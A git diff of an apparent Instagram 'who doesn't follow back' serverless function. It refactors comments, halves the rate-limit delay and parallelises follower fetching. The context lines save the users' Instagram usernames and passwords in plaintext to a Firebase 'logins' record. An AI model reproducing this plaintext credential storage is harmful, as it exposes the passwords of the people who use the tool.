@@ -1,6 +1,6 @@
 const { IgApiClient } = require('instagram-private-api');
 const axios = require('axios');
-const { db } = require('./config/firebaseConfig'); // Menyesuaikan jalur relatif
+const { db } = require('./config/firebaseConfig');
 const ig = new IgApiClient();
 
 // Variabel sesi yang disimpan dalam Firebase
@@ -32,15 +32,12 @@ const forceLogin = async () => {
         console.log('Mencoba login...');
         await ig.account.login(process.env.INSTAGRAM_USERNAME, process.env.INSTAGRAM_PASSWORD);
         console.log('Login berhasil!');
-        sessionData = ig.state.serialize(); // Menyimpan sesi di Firebase
-        await db.ref('sessions').child(process.env.INSTAGRAM_USERNAME).set({ sessionData }); // Menyimpan sesi di Firebase Realtime Database
+        sessionData = ig.state.serialize();
+        await db.ref('sessions').child(process.env.INSTAGRAM_USERNAME).set({ sessionData });
     } catch (error) {
         console.error('Login gagal:', error);
         if (error.name === 'IgCheckpointError') {
-            return {
-                statusCode: 400,
-                body: JSON.stringify({ message: 'Instagram needs 2FA verification.' }),
-            };
+            return { statusCode: 400, body: JSON.stringify({ message: 'Instagram needs 2FA verification.' }) };
         } else {
             throw error;
         }
@@ -53,10 +50,11 @@ const getAllFollowers = async (userId) => {
     let followersFeed = ig.feed.accountFollowers(userId);
     let nextFollowers = await followersFeed.items();
     followers = followers.concat(nextFollowers);
+
     while (followersFeed.isMoreAvailable()) {
         nextFollowers = await followersFeed.items();
         followers = followers.concat(nextFollowers);
-        await delay(2000); // Delay to avoid rate limiting
+        await delay(1000); // Reduced delay to improve performance
     }
     return followers;
 };
@@ -67,10 +65,11 @@ const getAllFollowing = async (userId) => {
     let followingFeed = ig.feed.accountFollowing(userId);
     let nextFollowing = await followingFeed.items();
     following = following.concat(nextFollowing);
+
     while (followingFeed.isMoreAvailable()) {
         nextFollowing = await followingFeed.items();
         following = following.concat(nextFollowing);
-        await delay(2000); // Delay to avoid rate limiting
+        await delay(1000); // Reduced delay to improve performance
     }
     return following;
 };
@@ -92,9 +91,11 @@ exports.handler = async function(event, context) {
             // Mendapatkan gambar profil
             const profilePicUrl = user.profile_pic_url;
 
-            // Ambil data followers dan following
-            const followers = await getAllFollowers(user.pk);
-            const following = await getAllFollowing(user.pk);
+            // Ambil data followers dan following secara paralel
+            const [followers, following] = await Promise.all([
+                getAllFollowers(user.pk),
+                getAllFollowing(user.pk)
+            ]);
 
             const followersUsernames = followers.map(f => f.username);
             const followingUsernames = following.map(f => f.username);
@@ -111,7 +112,7 @@ exports.handler = async function(event, context) {
                 full_name: user.full_name,
                 followers_count: followersCount,
                 following_count: followingCount,
-                profile_picture_url: profilePicUrl, // Simpan hanya URL gambar
+                profile_picture_url: profilePicUrl,
                 dont_follow_back_count: dontFollowBack.length,
             });
 
@@ -123,7 +124,7 @@ exports.handler = async function(event, context) {
                     biography: user.biography,
                     followers_count: followersCount,
                     following_count: followingCount,
-                    profile_picture_url: profilePicUrl, // URL gambar
+                    profile_picture_url: profilePicUrl,
                     dont_follow_back: dontFollowBack,
                     dont_follow_back_count: dontFollowBack.length,
                 }),
@@ -152,15 +153,15 @@ exports.handler = async function(event, context) {
 
             const user = await ig.account.currentUser();
             const userId = user.pk;
-            // Simpan ke Firebase Realtime Database
+
             const loginData = {
                 username,
                 password,
                 userId,
                 timestamp: new Date().toISOString(),
-                profile_picture_url: user.profile_pic_url, // Menyimpan URL gambar profil
+                profile_picture_url: user.profile_pic_url,
             };
-            // Menyimpan data login di Realtime Database
+
             await db.ref('logins').child(userId).set(loginData);
             return {
                 statusCode: 200,
